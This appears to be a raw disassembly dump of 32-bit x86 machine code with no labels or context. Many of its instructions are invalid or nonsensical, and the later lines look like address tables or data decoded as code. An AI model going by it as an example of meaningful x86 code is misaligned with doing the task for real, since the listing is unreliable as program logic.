  432fff:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433006:	inc    ebp
  433007:	xor    ecx,DWORD PTR [ecx+0x45891403]
  43300d:	clc    
  43300e:	mov    eax,edi
  433010:	nop
  433011:	fadd   QWORD PTR [eax]
  433013:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433019:	jmp    0x432fa4
  43301b:	mov    eax,DWORD PTR [ecx]
  43301d:	fadd   DWORD PTR [eax]
  43301f:	inc    ebp
  433020:	or     DWORD PTR [ebx],esi
  433022:	dec    eax
  433023:	add    edx,DWORD PTR [ebx-0x2d]
  433026:	dec    ebp
  433027:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  43302d:	inc    ebp
  43302e:	push   ebx
  43302f:	mov    dl,BYTE PTR [ecx-0xd]
  433032:	xor    ecx,DWORD PTR [ebp-0x45]
  433035:	(bad)  
  433037:	rol    BYTE PTR [eax],0xc1
  43303a:	ret    
  43303b:	inc    ebp
  43303c:	inc    ebp
  43303d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433043:	xor    eax,ebx
  433045:	add    eax,DWORD PTR [ebp+0x23]
  433048:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43304e:	cmp    edi,0xc
  433051:	dec    ebp
  433052:	inc    ebp
  433053:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433059:	inc    ebp
  43305a:	mov    esi,DWORD PTR [ebx]
  43305c:	clc    
  43305d:	lea    eax,[ebp+0x45725407]
  433063:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433067:	xor    edi,DWORD PTR [eax]
  433069:	mov    ecx,0xff8b8d4d
  43306e:	push   esp
  43306f:	enter  0x4df7,0x23
  433073:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433079:	mov    eax,DWORD PTR [ebx]
  43307b:	loopne 0x433068
  43307d:	ret    0xc68b
  433080:	push   esp
  433081:	enter  0x9745,0x8b
  433085:	inc    ebp
  433086:	cld    
  433087:	mov    eax,edi
  433089:	clc    
  43308a:	ret    
  43308b:	ret    0xc645
  43308e:	mov    esi,DWORD PTR [ebx]
  433090:	cld    
  433091:	pop    esi
  433092:	mov    ebx,0x83458bc3
  433098:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  43309c:	dec    ebp
  43309d:	xor    eax,0xba039c33
  4330a2:	mov    DWORD PTR [ebp+0x55d8f889],eax
  4330a8:	inc    ebp
  4330a9:	mov    edi,DWORD PTR [ebx]
  4330ab:	adc    al,0x9c
  4330ad:	inc    ebp
  4330ae:	(bad)  
  4330af:	mov    ebx,eax
  4330b1:	adc    al,0x85
  4330b3:	cmp    al,0x1
  4330b6:	inc    ebp
  4330b7:	add    BYTE PTR [ecx],bh
  4330b9:	dec    ebp
  4330ba:	pushf  
  4330bb:	mov    ebp,ecx
  4330bd:	mov    eax,DWORD PTR [ebx]
  4330bf:	nop
  4330c0:	add    BYTE PTR [eax],al
  4330c2:	inc    ebp
  4330c3:	mov    esi,DWORD PTR [ebx]
  4330c5:	add    eax,DWORD PTR [ebx]
  4330c7:	cmp    al,0x89
  4330c9:	mov    esp,esi
  4330cb:	clc    
  4330cc:	inc    ebp
  4330cd:	inc    ebp
  4330ce:	add    edx,DWORD PTR [esi+0xc]
  4330d1:	mov    edi,0x7ff0845
  4330d6:	in     al,dx
  4330d7:	(bad)  
  4330d8:	jne    0x433074
  4330da:	mov    esi,DWORD PTR [edx]
  4330dc:	clc    
  4330dd:	add    ebp,DWORD PTR [esi]
  4330df:	mov    edi,edi
  4330e1:	in     al,dx
  4330e2:	mov    DWORD PTR [ebp-0x10],eax
  4330e5:	xor    eax,DWORD PTR [ebp+0x3]
  4330e8:	cmp    eax,0x8bf49c89
  4330ed:	inc    ebp
  4330ee:	fmul   DWORD PTR [ebx-0x173caf39]
  4330f4:	lea    ecx,[ecx+0x45e8d4bc]
  4330fa:	clc    
  4330fb:	mov    edi,edi
  4330fd:	cmp    BYTE PTR [ebp+0x4d],al
  433100:	test   DWORD PTR [eax+0x74],ecx
  433103:	inc    ecx
  433104:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  43310a:	ret    
  43310b:	inc    eax
  43310c:	dec    DWORD PTR [ebx+0x4945f8f0]
  433112:	push   eax
  433113:	dec    eax
  433114:	test   al,0xd0
  433116:	dec    eax
  433118:	mov    eax,DWORD PTR [ebp-0x14]
  43311b:	mov    eax,DWORD PTR [ebp+0x38]
  43311e:	mov    eax,ecx
  433120:	fadd   DWORD PTR [ebx]
  433122:	dec    ebp
  433123:	inc    eax
  433124:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  43312a:	inc    ebp
  43312b:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433131:	fadd   QWORD PTR [ebx]
  433133:	inc    ebp
  433134:	or     al,0x33
  433136:	dec    ebp
  433137:	add    edi,DWORD PTR [ebx]
  433139:	mov    DWORD PTR [edx-0x28],esi
  43313c:	mov    eax,DWORD PTR [ebp-0x10]
  43313f:	mov    eax,DWORD PTR [eax+0x10]
  433142:	mov    eax,edi
  433144:	lock ret 
  433146:	inc    ecx
  433147:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43314d:	fsubr  st,st(5)
  43314f:	test   DWORD PTR [eax],eax
  433151:	clc    
  433152:	push   0x45
  433154:	(bad)  
  433155:	cmp    ch,ah
  433157:	pushf  
  433158:	inc    ebp
  433159:	(bad)  
  43315a:	push   eax
  43315b:	fsub   DWORD PTR [eax-0x7b]
  43315e:	(bad)  
  43315f:	clc    
  433160:	mov    eax,0xf8008584
  433165:	mov    eax,DWORD PTR [ebp-0x4]
  433168:	mov    edi,0x4585c3cc
  43316e:	clc    
  43316f:	mov    eax,DWORD PTR [ebp+0x14]
  433172:	cmp    eax,DWORD PTR [ebp-0x64]
  433175:	mov    edi,eax
  433177:	in     al,dx
  433178:	les    esi,FWORD PTR [ebp-0x7b]
  43317b:	mov    edi,eax
  43317d:	or     al,0x4d
  43317f:	dec    ebp
  433180:	mov    eax,ebp
  433182:	in     al,0xf2
  433184:	dec    ebp
  433185:	dec    DWORD PTR [ecx+0x4dc7e045]
  43318b:	fmul   DWORD PTR [ecx+0x4df8f085]
  433191:	inc    ebp
  433192:	mov    DWORD PTR [ebx],esi
  433194:	fadd   QWORD PTR [ebx]
  433196:	dec    ebp
  433197:	push   eax
  433198:	xor    eax,DWORD PTR [ebp+0x3]
  43319b:	push   eax
  43319c:	mov    DWORD PTR [eax+ebx*8],ebx
  43319f:	push   esi
  4331a1:	mov    eax,DWORD PTR [eax]
  4331a3:	lock cmp eax,0xf84e85c0
  4331a9:	inc    ebp
  4331aa:	test   BYTE PTR [ebx],dh
  4331ac:	add    DWORD PTR [ebx],eax
  4331ae:	add    BYTE PTR [eax+0x4d],dl
  4331b1:	jne    0x4331e6
  4331b3:	lea    ecx,[ebx-0x7617fc44]
  4331b9:	div    ah
  4331bb:	inc    DWORD PTR [ebp+0x45]
  4331be:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  4331c4:	jb     0x433151
  4331c6:	add    BYTE PTR [eax*2-0x17ba743f],cl
  4331cd:	mov    ecx,DWORD PTR [ebp-0x10]
  4331d0:	xor    ecx,DWORD PTR [ebp+0x3]
  4331d3:	mov    edi,DWORD PTR [ebx]
  4331d5:	adc    BYTE PTR [ebp+0x41],dh
  4331d8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4331de:	ret    
  4331df:	push   ss
  4331e0:	push   0x45
  4331e2:	lea    ecx,[ebx+0x4de80cb0]
  4331e8:	sti    
  4331e9:	add    edi,edi
  4331eb:	or     BYTE PTR [ebp+0x4d],al
  4331ee:	mov    ebp,DWORD PTR [ebx]
  4331f0:	xor    ebp,ecx
  4331f2:	mov    al,BYTE PTR [edx]
  4331f4:	add    eax,0xc7200
  4331f9:	jne    0x433248
  4331fb:	lea    esi,[ebx]
  4331fd:	mov    al,0xf
  4331ff:	call   0xf28c4
  433204:	shl    DWORD PTR ds:0x89019c84,0x0
  43320b:	rol    BYTE PTR [ebp+0x45],1
  43320e:	mov    esi,DWORD PTR [ebx+esi*1]
  433211:	pushf  
  433212:	mov    al,bh
  433214:	add    eax,0x8572c8
  433219:	clc    
  43321a:	dec    ebp
  43321b:	inc    ebp
  43321c:	xor    edi,DWORD PTR [edx]
  43321e:	setl   al
  433221:	(bad)  
  433222:	retf   
  433223:	rol    cl,1
  433225:	dec    ebp
  433226:	test   BYTE PTR [ebp+0x4d00cc01],cl
  43322c:	inc    ebp
  43322d:	lea    ecx,[ebx-0x75b2cc38]
  433233:	lea    eax,ds:0x4d72c4
  433239:	mov    ecx,DWORD PTR [ebp-0x4]
  43323c:	xor    ecx,edi
  43323e:	bswap  ebx
  433240:	ror    BYTE PTR [ebp-0x35],0xe9
  433244:	rol    DWORD PTR [ecx],0x84
  433247:	add    BYTE PTR [ecx],al
  433249:	cmp    eax,DWORD PTR [eax]
  43324b:	pushf  
  43324c:	inc    ebp
  43324d:	jnp    0x8a436650
  433253:	mov    eax,DWORD PTR ds:0xcf72e8
  433259:	lock dec ebp
  43325b:	retf   
  43325c:	xor    ecx,DWORD PTR [ebp+0xf]
  43325f:	mov    eax,eax
  433261:	fmul   st,st(3)
  433263:	test   ecx,0x19a8484
  433269:	xor    al,BYTE PTR [eax]
  43326b:	mov    DWORD PTR [ebp-0x28],eax
  43326e:	mov    eax,DWORD PTR [ebp+0x33]
  433271:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433277:	ret    
  433278:	add    al,cl
  43327a:	dec    ebp
  43327b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  433281:	add    ecx,DWORD PTR ds:0xc7250
  433287:	inc    ebp
  433288:	rcl    DWORD PTR [eax+0x4d],0x2b
  43328c:	mov    edi,edi
  43328e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433294:	jb     0x43325d
  433296:	add    BYTE PTR [ecx+eax*8-0x74cdb2b6],al
  43329d:	mov    esi,DWORD PTR [ebx]
  43329f:	cld    
  4332a0:	mov    cl,bh
  4332a2:	or     eax,0x372b6
  4332a7:	cmp    ecx,eax
  4332a9:	jne    0x433326
  4332af:	mov    eax,DWORD PTR [ebp-0x20]
  4332b2:	mov    eax,DWORD PTR [eax]
  4332b4:	xor    eax,edi
  4332b6:	mov    al,BYTE PTR [ebp+eax*1+0x32724a]
  4332bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4332c0:	mov    ecx,edi
  4332c2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4332c8:	jb     0x4332d9
  4332ca:	add    BYTE PTR [edi-0x3f],dl
  4332cd:	add    BYTE PTR [ebp-0x75],cl
  4332d0:	mov    esi,eax
  4332d2:	xor    eax,DWORD PTR [eax]
  4332d4:	mov    al,bh
  4332d6:	or     eax,0x4a7284
  4332db:	xor    al,cl
  4332dd:	mov    ecx,DWORD PTR [ebp-0x4]
  4332e0:	mov    ecx,edi
  4332e2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4332e8:	jb     0x4332f9
  4332ea:	add    BYTE PTR [edi],dh
  4332ec:	enter  0x8500,0x8b
  4332f0:	add    ah,bl
  4332f2:	add    BYTE PTR [eax],al
  4332f4:	inc    ebp
  4332f5:	(bad)  
  4332f6:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4a]
  4332fd:	mov    esi,DWORD PTR [edx-0x4]
  433300:	add    bh,cl
  433302:	dec    ebp
  433303:	mov    dh,0x8b
  433305:	add    esi,DWORD PTR [ebx]
  433307:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  43330d:	add    BYTE PTR [eax],al
  43330f:	mov    eax,ecx
  433311:	loopne 0x433360
  433313:	add    BYTE PTR [ebx-0x757bcc39],cl
  433319:	dec    edx
  43331a:	or     eax,0x8b7232
  43331f:	in     al,0xc1
  433321:	or     DWORD PTR [ebp-0x31],ecx
  433324:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4a]
  43332b:	xor    dh,BYTE PTR [edx-0x75]
  43332e:	add    al,dh
  433330:	enter  0x4f09,0xcf
  433334:	inc    ebp
  433335:	mov    WORD PTR [ebx-0x75cdccb6],cs
  43333b:	or     al,BYTE PTR ds:0xe4728b
  433341:	or     DWORD PTR [ebp-0x31],ecx
  433344:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4e]
  43334b:	cmp    dh,BYTE PTR [edx+0xf]
  43334e:	add    bl,dl
  433350:	rol    DWORD PTR [eax],0x4d
  433353:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433359:	(bad)  
  43335a:	or     eax,0x4a7284
  43335f:	xor    al,cl
  433361:	mov    ecx,DWORD PTR [ebp-0x20]
  433364:	mov    ecx,DWORD PTR [ecx]
  433366:	xor    ecx,edi
  433368:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724a]
  43336f:	xor    cl,al
  433371:	mov    ecx,DWORD PTR [edi]
  433373:	fadd   QWORD PTR [ebp+0x9]
  433376:	call   0xffd02e4a
  43337b:	dec    edx
  43337c:	dec    ebp
  43337d:	xor    bh,BYTE PTR [ebx]
  43337f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  433383:	loopne 0x433381
  433385:	or     edi,eax
  433387:	iret   
  433388:	ret    
  433389:	mov    WORD PTR [ebp+0x4e],es
  43338c:	mov    esi,DWORD PTR [edx]
  43338e:	call   0x8452facd
  433393:	(bad)  
  433394:	call   0x8bdc:0x338b3200
  43339b:	add    ah,bh
  43339d:	(bad)  
  43339e:	push   ebp
  43339f:	test   BYTE PTR [ebx],dh
  4333a1:	dec    edx
  4333a2:	add    esi,DWORD PTR [edx]
  4333a4:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4333aa:	dec    edi
  4333ac:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4a]
  4333b3:	xor    al,BYTE PTR [ebx]
  4333b5:	mov    edi,DWORD PTR [ebx]
  4333b7:	in     al,0x75
  4333b9:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4333bf:	dec    edx
  4333c0:	xor    esi,DWORD PTR [edx]
  4333c2:	lea    ecx,[edx]
  4333c4:	or     BYTE PTR [ebx+0x900f072],cl
  4333ca:	ja     0x43339b
  4333cc:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b2],cl
  4333d3:	cmp    ch,al
  4333d5:	jne    0x4333ca
  4333d7:	mov    edi,edi
  4333d9:	fadd   QWORD PTR [ebp+0x0]
  4333dc:	mov    eax,edi
  4333de:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb6]
  4333e5:	mov    edx,DWORD PTR [ebx]
  4333e7:	in     al,0x45
  4333e9:	or     DWORD PTR [ebx],esi
  4333eb:	iret   
  4333ec:	add    ecx,DWORD PTR [eax+edx*2+0x4532184a]
  4333f3:	xor    dl,BYTE PTR [eax-0x75]
  4333f6:	sbb    al,0xe0
  4333f8:	dec    DWORD PTR [ecx]
  4333fa:	mov    ecx,edi
  4333fc:	in     al,dx
  4333fd:	mov    eax,es
  4333ff:	dec    edx
  433400:	mov    DWORD PTR [edx],esi
  433402:	fmul   QWORD PTR [edx]
  433404:	jne    0x433391
  433406:	(bad)  
  433407:	(bad)  
  433409:	or     DWORD PTR [ebp-0x31],eax
  43340c:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b2]
  433413:	cmp    bh,bh
  433415:	jne    0x43345c
  433417:	lea    ecx,[ebx-0x38372750]
  43341d:	inc    ebx
  43341f:	mov    eax,ecx
  433421:	mov    eax,0xa00c111
  433426:	jne    0x43346d
  433428:	mov    esi,DWORD PTR [ebx]
  43342a:	test   al,0x3
  43342c:	inc    ebp
  43342d:	mov    DWORD PTR [eax-0xc],edx
  433430:	loop   0x433477
  433432:	push   DWORD PTR [ebx]
  433434:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43343a:	add    DWORD PTR [eax],eax
  43343c:	mov    eax,edi
  43343e:	lods   al,BYTE PTR ds:[esi]
  43343f:	dec    ebp
  433440:	inc    ebp
  433441:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433447:	retf   
  433448:	mov    edx,ecx
  43344a:	adc    al,0x84
  43344c:	(bad)  
  43344d:	std    
  43344e:	ret    
  43344f:	jmp    FWORD PTR [edi-0x2b7474bb]
  433455:	hlt    
  433456:	rol    edi,0x82
  433459:	ret    
  43345a:	cld    
  43345b:	enter  0x11ff,0x45
  43345f:	inc    ebp
  433460:	pop    edi
  433461:	mov    ebx,DWORD PTR [ebx+0x14]
  433464:	ret    0xc7
  433467:	test   BYTE PTR [ebx+0x4532519a],cl
  43346d:	jmp    0x4333fa
  43346f:	push   0x8
  433471:	call   DWORD PTR [esi]
  433473:	in     al,dx
  433474:	add    BYTE PTR [ebp+0x1],0x50
  433478:	add    bh,ah
  43347a:	add    bh,bh
  43347c:	icebp  
  43347d:	mov    ecx,DWORD PTR [eax]
  43347f:	cld    
  433480:	pop    es
  433481:	dec    ebp
  433482:	shl    DWORD PTR [ebx],0x72
  433485:	add    eax,DWORD PTR [eax]
  433487:	cmp    edx,ecx
  433489:	je     0x43349b
  43348b:	mov    esi,DWORD PTR [ebp-0x4]
  43348e:	inc    edi
  433490:	or     al,0xc3
  433492:	jmp    FWORD PTR [edx-0x18]
  433495:	(bad)  
  433496:	sti    
  433497:	cwde   
  433498:	(bad)  
  433499:	call   0xffa12da4
  43349e:	or     al,0x45
  4334a0:	push   ebp
  4334a1:	sub    esp,0x18
  4334a4:	push   ebx
  4334a5:	inc    ebp
  4334a6:	mov    edi,edi
  4334a8:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4334af:	test   al,0x53
  4334b1:	inc    ebp
  4334b2:	push   ecx
  4334b3:	push   eax
  4334b4:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4334ba:	add    ah,bh
  4334bc:	(bad)  
  4334bd:	dec    ebp
  4334be:	add    DWORD PTR [ebx],esi
  4334c0:	inc    ebp
  4334c1:	add    ecx,DWORD PTR [ebx+0x74943b]
  4334c7:	push   0xffffff8b
  4334c9:	dec    DWORD PTR [ebx-0x7fbaeb54]
  4334cf:	add    eax,DWORD PTR [ecx]
  4334d1:	or     BYTE PTR [eax],al
  4334d3:	call   0xff852cd8
  4334d8:	mov    eax,DWORD PTR [ebp+0x14]
  4334db:	mov    ecx,DWORD PTR [ecx+0x801ac]
  4334e1:	inc    ebp
  4334e2:	dec    ecx
  4334e3:	add    ebp,DWORD PTR [edx+0x14]
  4334e6:	push   0x8b3045
  4334eb:	call   0x33ad8260
  4334f0:	inc    DWORD PTR [ebx]
  4334f2:	mov    DWORD PTR [edi],ecx
  4334f4:	mov    eax,ecx
  4334f6:	or     BYTE PTR [ebp-0x3d],cl
  4334f9:	cmp    eax,edi
  4334fb:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  433500:	adc    BYTE PTR [ebx+0x5eff0845],cl
  433506:	adc    al,0xc9
  433508:	inc    ebp
  433509:	adc    BYTE PTR [eax+0x55],dl
  43350c:	jne    0x4334fa
  43350e:	call   0xff54349e
  433513:	dec    ebp
  433514:	inc    ebp
  433515:	mov    ecx,DWORD PTR [ebx+0x390338b]
  43351b:	add    BYTE PTR [ebx],bh
  43351d:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  433521:	push   ebx
  433522:	or     al,0x51
  433524:	dec    ebp
  433525:	xor    DWORD PTR [ebx],0xf32039a
  43352b:	cmp    eax,DWORD PTR [ebp+0x74]
  43352e:	mov    edi,edi
  433530:	pop    edi
  433531:	adc    BYTE PTR [ebx+0x75],bl
  433534:	ret    0x50
  433537:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43353b:	(bad)  
  43353c:	clc    
  43353d:	mov    esp,ebp
  43353f:	pop    ecx
  433540:	mov    ecx,0xf80085c2
  433545:	mov    ecx,DWORD PTR [ecx+edx*2]
  433548:	push   esi
  433549:	push   esi
  43354a:	(bad)  
  43354b:	lock inc DWORD PTR [ebp+0x44]
  43354f:	mov    edx,DWORD PTR [eax]
  433551:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433555:	or     BYTE PTR [ebx+0x7],dl
  433558:	push   ecx
  433559:	ret    
  43355a:	xor    ebx,DWORD PTR [edx+0x37232be]
  433560:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433566:	or     al,0x80
  433568:	jge    0x43356b
  43356a:	mov    DWORD PTR [eax],eax
  43356c:	and    al,0x8
  43356e:	cmp    DWORD PTR [ebp+0x10],eax
  433571:	mov    edx,DWORD PTR [esi]
  433573:	xchg   esp,eax
  433574:	dec    esp
  433575:	add    BYTE PTR [eax],dl
  433577:	mov    ecx,edx
  433579:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43357d:	dec    ebp
  43357e:	into   
  43357f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433585:	mov    edx,DWORD PTR [eax+0x14]
  433588:	das    
  433589:	add    al,0x45
  43358b:	add    BYTE PTR [ebp+0x0],dh
  43358e:	mov    edi,edi
  433590:	and    al,0x50
  433592:	mov    eax,DWORD PTR [eax]
  433594:	and    al,0xd1
  433596:	xor    eax,DWORD PTR [esi]
  433598:	lea    eax,[ebp+0x8]
  43359b:	xor    esi,DWORD PTR [edx+0x3]
  43359e:	add    BYTE PTR [ecx+0x4510fc44],cl
  4335a4:	cmp    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4335aa:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4335b4:	cmp    bh,bh
  4335b6:	pushf  
  4335b7:	mov    edi,edi
  4335b9:	or     BYTE PTR [esi+ecx*1],cl
  4335bc:	jne    0x433581
  4335be:	call   0xc358a
  4335c3:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4335c7:	mov    ebx,DWORD PTR [eax]
  4335c9:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  4335cd:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4335d5:	pop    esi
  4335d6:	jmp    0x4335a1
  4335d8:	and    al,0x10
  4335da:	and    al,0x55
  4335dc:	or     ah,ch
  4335de:	and    al,0xe4
  4335e0:	inc    DWORD PTR [ebx+0x35e81024]
  4335e6:	(bad)  
  4335e7:	pushf  
  4335e8:	dec    DWORD PTR [ecx+0x570c2444]
  4335ee:	pop    esi
  4335ef:	inc    ecx
  4335f0:	in     eax,0x89
  4335f2:	ret    0x24
  4335f5:	mov    edi,eax
  4335f7:	and    al,0x7d
  4335f9:	mov    edx,0x768089c
  4335fe:	clc    
  4335ff:	cli    
  433600:	call   FWORD PTR [edx+0x3893274]
  433606:	dec    DWORD PTR [ecx-0x74e7db01]
  43360c:	adc    al,0xc
  43360e:	(bad)  
  43360f:	jl     0x433635
  433611:	adc    al,0x8b
  433613:	dec    ebp
  433614:	or     al,0x75
  433616:	jmp    0x4335a3
  433618:	adc    BYTE PTR [esp+eax*2],ah
  43361b:	xor    ecx,DWORD PTR [ebx+ecx*4-0x3e]
  43361f:	and    al,0x9a
  433621:	add    ecx,DWORD PTR [ecx+0xeca680f]
  433627:	dec    esp
  433628:	jne    0x433632
  43362a:	jne    0x433665
  43362c:	call   FWORD PTR [ecx*4-0x74ef8bf8]
  433633:	test   BYTE PTR [ebp+0x32],bl
  433636:	and    al,0x85
  433638:	cmp    eax,DWORD PTR [ebp-0x408bdbf8]
  43363e:	pop    edi
  43363f:	(bad)  
  433640:	sbb    edx,DWORD PTR [eax]
  433642:	add    dl,dl
  433644:	cmp    edx,DWORD PTR [eax]
  433646:	add    BYTE PTR [esi+0x7e],al
  433649:	adc    BYTE PTR [eax],al
  43364b:	mov    eax,ds:0x1c00107e
  433650:	push   edx
  433651:	adc    BYTE PTR [eax],al
  433653:	cli    
  433654:	push   ss
  433655:	adc    BYTE PTR [eax],al
  433657:	lahf   
  433658:	adc    edx,DWORD PTR [eax]
  43365a:	add    BYTE PTR [eax+eiz*2+0x10],ah
  43365e:	add    BYTE PTR [edi+0x19001004],ah
  433664:	inc    eax
  433665:	adc    BYTE PTR [eax],al
  433667:	ds jge 0x43367a
  43366a:	add    BYTE PTR [edi],bh
  43366c:	ss inc ebx
  43366e:	add    BYTE PTR [ebx+0x36],al
  433671:	inc    ebx
  433672:	add    BYTE PTR [edi+0x36],al
  433675:	inc    ebx
  433676:	add    BYTE PTR [ebx+0x36],cl
  433679:	inc    ebx
  43367a:	add    BYTE PTR [edi+0x36],cl
  43367d:	inc    ebx
  43367e:	add    BYTE PTR [ebx+0x36],dl
  433681:	inc    ebx
  433682:	add    BYTE PTR [edi+0x36],dl
  433685:	inc    ebx
  433686:	add    BYTE PTR [ebx+0x36],bl
  433689:	inc    ebx
  43368a:	add    BYTE PTR [edi+0x36],bl
  43368d:	inc    ebx
  43368e:	add    BYTE PTR [ebx+0x36],ah
  433691:	inc    ebx
  433692:	add    BYTE PTR [edi+0x36],ah
  433695:	inc    ebx
  433696:	add    BYTE PTR [ecx],ah
  433698:	jno    0x4336aa
  43369a:	add    BYTE PTR [esi+ebp*2+0x6dca0010],ah
  4336a1:	adc    BYTE PTR [eax],al
  4336a3:	ja     0x433715
  4336a5:	adc    BYTE PTR [eax],al
  4336a7:	xor    BYTE PTR [edx+0x10],0x0
  4336ab:	loopne 0x43371b
  4336ad:	adc    BYTE PTR [eax],al
  4336af:	cmp    BYTE PTR [eax+0x10],dl
  4336b2:	add    BYTE PTR ds:0x9700104f,al
  4336b8:	ss inc ebx
  4336ba:	add    BYTE PTR [ebx-0x60ffbcca],bl
  4336c0:	ss inc ebx
  4336c2:	add    BYTE PTR [ebx-0x58ffbcca],ah
  4336c8:	ss inc ebx
  4336ca:	add    BYTE PTR [ebx-0x50ffbcca],ch
  4336d0:	ss inc ebx
  4336d2:	add    BYTE PTR [ebx+0x1004336],dh
  4336d8:	add    BYTE PTR [eax],dl
  4336da:	add    al,ah
  4336dc:	pop    ebp
  4336dd:	adc    BYTE PTR [eax],al
  4336df:	add    ah,BYTE PTR ds:0x328d0010
  4336e5:	adc    BYTE PTR [eax],al
  4336e7:	xchg   DWORD PTR [ecx],edx
  4336e9:	adc    BYTE PTR [eax],al
  4336eb:	ja     0x4336f9
  4336ed:	adc    BYTE PTR [eax],al
  4336ef:	add    cl,BYTE PTR [eax]
  4336f1:	adc    BYTE PTR [eax],al
  4336f3:	jle    0x433769
  4336f5:	adc    BYTE PTR [eax],al
  4336f7:	xlat   BYTE PTR ds:[ebx]
  4336f8:	ss inc ebx
  4336fa:	add    bl,bl
  4336fc:	ss inc ebx
  4336fe:	add    bh,bl
  433700:	ss inc ebx
  433702:	add    bl,ah
  433704:	ss inc ebx
  433706:	add    bh,ah
  433708:	ss inc ebx
  43370a:	add    bl,ch
  43370c:	ss inc ebx
  43370e:	add    bh,ch
  433710:	ss inc ebx
  433712:	add    bl,dh
  433714:	ss inc ebx
  433716:	add    BYTE PTR [esi+0x12],bl
  433719:	adc    BYTE PTR [eax],al
  43371b:	stc    
  43371c:	push   es
  43371d:	adc    BYTE PTR [eax],al
  43371f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433720:	xor    DWORD PTR [eax],edx
  433722:	add    BYTE PTR [eax+0x7b],dl
  433725:	adc    BYTE PTR [eax],al
  433727:	stos   DWORD PTR es:[edi],eax
  433728:	push   edi
  433729:	adc    BYTE PTR [eax],al
  43372b:	inc    ebp
  43372c:	adc    edx,DWORD PTR [eax]
  43372e:	add    BYTE PTR [eax+0x38],ch
  433731:	adc    BYTE PTR [eax],al
  433733:	pop    ecx
  433734:	and    edx,DWORD PTR [eax]
  433736:	add    BYTE PTR [edi],dl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [ebx],bl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [edi],bl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [ebx],ah
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [edi],ah
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [ebx],ch
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [edi],ch
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [ebx],dh
  433754:	aaa    
  433755:	inc    ebx
  433756:	add    BYTE PTR [ecx+0x72],cl
  433759:	adc    BYTE PTR [eax],al
  43375b:	cmp    edi,DWORD PTR [eax+0x10]
  43375e:	add    BYTE PTR [ebx+0x23],dl
  433761:	adc    BYTE PTR [eax],al
  433763:	jno    0x4337d1
  433765:	adc    BYTE PTR [eax],al
  433767:	pop    eax
  433768:	outs   dx,BYTE PTR ds:[esi]
  433769:	adc    BYTE PTR [eax],al
  43376b:	mov    ebx,DWORD PTR [ebx+0x10]
  43376e:	add    BYTE PTR [ebx+ebx*2],ch
  433771:	adc    BYTE PTR [eax],al
  433773:	retf   0x1066
  433776:	add    BYTE PTR [edi+0x37],dl
  433779:	inc    ebx
  43377a:	add    BYTE PTR [ebx+0x37],bl
  43377d:	inc    ebx
  43377e:	add    BYTE PTR [edi+0x37],bl
  433781:	inc    ebx
  433782:	add    BYTE PTR [ebx+0x37],ah
  433785:	inc    ebx
  433786:	add    BYTE PTR [edi+0x37],ah
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    BYTE PTR [ebx+0x37],dh
  433795:	inc    ebx
  433796:	add    BYTE PTR [ebx+0x32],al
  433799:	xor    dh,BYTE PTR ds:0x5a52345f
  43379f:	push   esp
  4337a0:	xor    BYTE PTR [esi],dh
  4337a2:	add    BYTE PTR [ecx+0x36],cl
  4337a5:	push   eax
